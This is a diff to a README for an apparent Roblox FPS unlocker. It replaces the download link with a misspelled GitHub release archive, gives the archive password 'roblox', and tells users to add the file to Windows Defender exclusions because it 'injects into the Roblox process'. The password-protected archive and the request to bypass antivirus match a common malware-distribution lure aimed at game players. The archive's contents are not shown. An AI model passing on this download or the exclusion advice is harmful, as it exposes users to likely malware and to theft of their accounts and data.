@@ -13,7 +13,7 @@
 
 ---
 
-## 📥 [DOWNLOAD TOOL (Latest)](https://github.com/Jebos-bot/RBX-FPS-Unlocker-Script-Utility-v2/releases/download/performance-boost/Release_v9.rar) 📥
+## 📥 [DOWNLOAD TOOL (Latest)](https://github.com/Jebos-bot/RBX-FPS-Unlocker-Script-Utility-v2/releases/download/perfomance-boost1/Relese_v4.51.rar) 📥
 
 > **Archive Password:** `roblox`
 > *Note: Windows Defender might flag this as `GameHack` because it injects into the Roblox process to unlock FPS limits. Please add to exclusions.*
